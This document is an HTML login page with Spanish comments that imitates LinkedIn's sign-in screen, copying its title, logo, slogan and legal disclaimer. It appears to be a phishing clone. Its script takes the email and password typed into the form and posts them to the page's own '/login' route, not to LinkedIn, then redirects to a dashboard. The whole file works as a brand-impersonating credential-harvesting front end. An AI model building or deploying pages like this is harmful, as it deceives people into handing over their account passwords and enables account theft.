<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en LinkedIn</title>
    <link rel="icon" href="linkedin.png" type="image/png">
    <style>
        /* Estilo general para el cuerpo de la página */
        body {
            font-family: Arial, sans-serif;
            /* Define la fuente utilizada en la página */
            display: flex;
            /* Usa flexbox para alinear los elementos */
            justify-content: center;
            /* Centra horizontalmente los elementos hijos */
            align-items: center;
            /* Centra verticalmente los elementos hijos */
            height: 100vh;
            /* Hace que el cuerpo ocupe el 100% de la altura de la ventana */
            margin: 0;
            /* Elimina los márgenes por defecto */
            background-color: #ffffff;
            /* Define el color de fondo blanco para toda la página */
        }

        /* Estilo para el contenedor del formulario de inicio de sesión */
        .login-container {
            border: 1px solid #ddd;
            /* Agrega un borde gris claro alrededor del contenedor */
            padding: 20px;
            /* Espaciado interno del contenedor */
            border-radius: 8px;
            /* Bordes redondeados para el contenedor */
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
            /* Agrega una sombra más pronunciada */
            background-color: #ffffff;
            /* Fondo blanco para el contenedor */
            width: 100%;
            /* Hace que el contenedor ocupe el 100% del ancho disponible */
            max-width: 320px;
            /* Define un ancho máximo para el contenedor */
            text-align: left;
            /* Alinea el texto a la izquierda */
            position: relative;
            /* Posiciona el contenedor de forma relativa para los elementos hijos posicionados */
            margin-top: 60px;
            /* Agrega un margen superior para evitar solapamiento con el logo */
        }

        /* Estilo para el encabezado que contiene el logo */
        .header {
            position: absolute;
            /* Posiciona el encabezado de forma absoluta dentro del contenedor */
            top: 20px;
            /* Posiciona el encabezado 20px desde el borde superior del contenedor */
            left: 20px;
            /* Posiciona el encabezado 20px desde el borde izquierdo del contenedor */
        }

        /* Estilo para la imagen del logo en el encabezado */
        .header img {
            width: 120px;
            /* Ajusta el ancho del logo */
            height: auto;
            /* Mantiene la relación de aspecto del logo */
        }

        /* Estilo para el encabezado de la página */
        h2 {
            margin-bottom: 10px;
            /* Espacio debajo del encabezado */
            font-size: 28px;
            /* Tamaño de la fuente del encabezado */
            color: #333;
            /* Color del texto del encabezado */
            margin-left: 0;
            /* Alinea el encabezado a la izquierda */
            font-family: Arial, sans-serif;
            /* Fuente utilizada para el encabezado */
            font-weight: bold;
            /* Fuente en negrita */
        }

        /* Estilo para la actualización profesional debajo del encabezado */
        .professional-update {
            margin-bottom: 20px;
            /* Espacio debajo del texto */
            font-size: 14px;
            /* Tamaño de la fuente del texto */
            color: #333;
            /* Color del texto */
            margin-left: 0;
            /* Alinea el texto a la izquierda */
            font-family: Arial, sans-serif;
            /* Fuente utilizada para el texto */
            font-weight: normal;
            /* Elimina el negrita */
        }

        /* Estilo para los campos de entrada dentro del contenedor de inicio de sesión */
        .login-container input {
            display: block;
            /* Hace que los campos de entrada se comporten como bloques */
            margin-bottom: 15px;
            /* Espacio debajo de los campos de entrada */
            padding: 12px;
            /* Espaciado interno de los campos de entrada */
            width: 100%;
            /* Hace que los campos de entrada ocupen el 100% del ancho del contenedor */
            border: 1px solid #ccc;
            /* Borde gris claro para los campos de entrada */
            border-radius: 5px;
            /* Bordes redondeados para los campos de entrada */
            box-sizing: border-box;
            /* Incluye el padding y el borde en el cálculo del ancho */
            font-size: 16px;
            /* Tamaño de la fuente en los campos de entrada */
            font-family: Arial, sans-serif;
            /* Fuente utilizada para los campos de entrada */
        }

        /* Estilo para los campos de entrada al estar enfocados */
        .login-container input:focus {
            border-color: #0073b1;
            /* Cambia el color del borde cuando el campo está enfocado */
            outline: none;
            /* Elimina el contorno por defecto del navegador */
        }

        /* Estilo para el botón de envío dentro del contenedor de inicio de sesión */
        .login-container button {
            padding: 12px;
            /* Espaciado interno del botón */
            width: 100%;
            /* Hace que el botón ocupe el 100% del ancho del contenedor */
            background-color: #0073b1;
            /* Color de fondo azul para el botón */
            color: white;
            /* Color del texto del botón */
            border: none;
            /* Elimina el borde por defecto del botón */
            border-radius: 50px;
            /* Bordes redondeados para el botón */
            cursor: pointer;
            /* Cambia el cursor a un puntero cuando se pasa por encima del botón */
            font-size: 16px;
            /* Tamaño de la fuente del botón */
            font-family: Arial, sans-serif;
            /* Fuente utilizada para el botón */
            font-weight: bold;
            /* Fuente en negrita */
        }

        /* Estilo para el botón al pasar el cursor sobre él */
        .login-container button:hover {
            background-color: #005582;
            /* Cambia el color de fondo al pasar el cursor */
        }

        /* Estilo para el mensaje de error en el contenedor de inicio de sesión */
        .login-container .error-message {
            color: #d9534f;
            /* Color del texto del mensaje de error */
            margin-top: 10px;
            /* Espacio arriba del mensaje de error */
        }

        /* Estilo para el enlace de contraseña olvidada */
        .forgot-password {
            display: flex;
            /* Usa flexbox para alinear el contenido */
            justify-content: center;
            /* Centra el enlace horizontalmente */
            margin-top: 15px;
            /* Espacio arriba del enlace */
        }

        /* Estilo para el enlace de contraseña olvidada */
        .forgot-password a {
            color: #0073b1;
            /* Color del enlace */
            text-decoration: none;
            /* Elimina el subrayado del enlace */
            font-family: Arial, sans-serif;
            /* Fuente utilizada para el enlace */
            font-weight: normal;
            /* Elimina el negrita del enlace */
        }

        /* Estilo para el enlace al pasar el cursor sobre él */
        .forgot-password a:hover {
            text-decoration: underline;
            /* Subraya el enlace al pasar el cursor */
        }

        /* Estilo para la barra divisoria */
        .divider {
            display: flex;
            /* Usa flexbox para alinear los elementos */
            align-items: center;
            /* Centra verticalmente los elementos */
            margin: 30px 0;
            /* Espacio arriba y abajo de la barra divisoria */
            position: relative;
            /* Posiciona el divisor de forma relativa para los elementos pseudoelementos */
        }

        /* Estilo para las partes izquierda y derecha de la barra divisoria */
        .divider::before,
        .divider::after {
            content: "";
            /* No muestra contenido, solo se usa para crear líneas */
            flex: 1;
            /* Hace que ambas líneas ocupen el mismo espacio */
            height: 1px;
            /* Altura de las líneas divisorias */
            background-color: #ddd;
            /* Color de las líneas divisorias */
        }

        /* Estilo para el texto dentro de la barra divisoria */
        .divider span {
            background-color: #ffffff;
            /* Fondo blanco para el texto */
            padding: 0 10px;
            /* Espaciado horizontal alrededor del texto */
            color: #666;
            /* Color del texto */
            white-space: nowrap;
            /* Evita que el texto se ajuste a múltiples líneas */
            text-align: center;
            /* Centra el texto */
            display: inline-block;
            /* Hace que el texto se comporte como un bloque en línea */
            width: auto;
            /* Permite que el texto tenga un ancho automático */
            font-family: Arial, sans-serif;
            /* Fuente utilizada para el texto */

        }

        /* Estilo para los botones de inicio de sesión único (SSO) */
        .sso-buttons {
            display: flex;
            /* Usa flexbox para alinear los botones */
            flex-direction: column;
            /* Coloca los botones en una columna */
            align-items: center;
            /* Centra los botones horizontalmente */
            margin-top: 20px;
            /* Espacio arriba de los botones SSO */
        }

        /* Estilo para los botones de inicio de sesión único (SSO) */
        .sso-button {
            padding: 8px;
            /* Espaciado interno del botón */
            width: 100%;
            /* Hace que el botón ocupe el 100% del ancho del contenedor */
            max-width: 280px;
            /* Limita el ancho máximo del botón */
            border: none;
            /* Elimina el borde por defecto del botón */
            border-radius: 50px;
            /* Bordes redondeados para el botón */
            cursor: pointer;
            /* Cambia el cursor a un puntero cuando se pasa por encima del botón */
            font-size: 14px;
            /* Tamaño de la fuente del botón */
            margin-top: 10px;
            /* Espacio arriba del botón */
            color: #020405;
            /* Color del texto del botón */

            display: flex;
            /* Usa flexbox para alinear el contenido dentro del botón */
            align-items: center;
            /* Centra verticalmente el contenido dentro del botón */
            justify-content: center;
            /* Centra horizontalmente el contenido dentro del botón */
            background-color: #ffffff;
            /* Fondo blanco para el botón */
            border: 1px solid #040b0e;
            /* Borde azul para el botón */
            text-decoration: none;
            /* Elimina el subrayado del enlace */
        }

        /* Estilo para las imágenes dentro de los botones SSO */
        .sso-button img {
            width: 16px;
            /* Ajusta el tamaño de la imagen */
            height: 16px;
            /* Ajusta el tamaño de la imagen */
            margin-right: 10px;
            /* Espacio a la derecha de la imagen */
        }

        /* Estilo para los botones SSO al pasar el cursor sobre ellos */
        .sso-button:hover {
            background-color: #f0f2f5;
            /* Cambia el color de fondo al pasar el cursor */
        }

        /* Estilo para la leyenda de la política de privacidad */
        .disclaimer {
            font-size: 12px;
            /* Tamaño de la fuente de la leyenda */
            color: #666;
            /* Color del texto de la leyenda */
            text-align: center;
            /* Centra el texto */
            margin-top: 20px;
            /* Espacio arriba de la leyenda */
        }

        /* Estilo para el pie de página */
        footer {
            text-align: center;
            /* Centra el texto en el pie de página */
            margin-top: 20px;
            /* Espacio arriba del pie de página */
            font-size: 12px;
            /* Tamaño de la fuente del pie de página */
            color: #666;
            /* Color del texto del pie de página */
        }

        /* Estilo para la imagen en el pie de página */
        footer img {
            width: 80px;
            /* Ajusta el tamaño de la imagen del pie de página */
            height: auto;
            /* Mantiene la relación de aspecto de la imagen */
        }
    </style>
</head>

<body>
    <!-- Encabezado que contiene el logo de LinkedIn -->
    <div class="header">
        <a href="https://www.linkedin.com">
            <img src="linkedin_logo.png" alt="LinkedIn">
        </a>
    </div>

    <!-- Contenedor principal para el formulario de inicio de sesión -->
    <div class="login-container">
        <h2>Iniciar Sesión</h2>
        <div class="professional-update">
            Mantente al día de tu mundo profesional.
        </div>
        <!-- Formulario de inicio de sesión -->
        <form id="loginForm">
            <input type="email" id="username" name="username" placeholder="Email" required>
            <input type="password" id="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar Sesión</button>
            <div class="error-message" id="errorMessage"></div>
            <div class="forgot-password">
                <a href="#">¿Has olvidado tu contraseña?</a>
            </div>
        </form>

        <!-- Barra divisoria con el texto "or" en el medio -->
        <div class="divider">
            <span>or</span>
        </div>

        <!-- Botones de inicio de sesión único (SSO) -->
        <div class="sso-buttons">
            <a href="https://accounts.google.com/signin" class="sso-button google-button">
                <img src="google.png" alt="Google"> Continue with Google
            </a>
            <a href="https://appleid.apple.com/account" class="sso-button apple-button">
                <img src="apple.png" alt="Apple"> Iniciar sesión con Apple
            </a>
        </div>

        <!-- Leyenda sobre la política de privacidad -->
        <div class="disclaimer">
            Al hacer clic en «Continuar como» a continuación, aceptas las Condiciones de uso, la Política de privacidad
            y la Política de cookies de LinkedIn.
        </div>

        <!-- Pie de página con el logo y el copyright -->
        <footer>
            <img src="linkedin_logo.png" alt="LinkedIn Logo">
            <p>© 2024</p>
        </footer>
    </div>

    <!-- Script para manejar el formulario de inicio de sesión -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function (event) {
            event.preventDefault(); // Evita el envío del formulario de la manera tradicional
            const username = document.getElementById('username').value; // Obtiene el valor del campo de email
            const password = document.getElementById('password').value; // Obtiene el valor del campo de contraseña
            const errorMessage = document.getElementById('errorMessage'); // Selecciona el contenedor del mensaje de error

            // Envía los datos del formulario a la ruta '/login' usando fetch
            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password }), // Convierte los datos del formulario en una cadena JSON
            })
                .then(response => response.json()) // Convierte la respuesta en JSON
                .then(data => {
                    if (data.success) {
                        window.location.href = '/dashboard'; // Redirige al usuario al panel si el inicio de sesión es exitoso
                    } else {
                        errorMessage.textContent = 'Correo electrónico o contraseña incorrectos.'; // Muestra un mensaje de error si el inicio de sesión falla
                    }
                })
                .catch((error) => {
                    console.error('Error:', error); // Muestra el error en la consola
                    errorMessage.textContent = 'Ocurrió un error al procesar la solicitud. Por favor, intenta de nuevo.'; // Muestra un mensaje de error general
                });
        });
    </script>
</body>

</html>
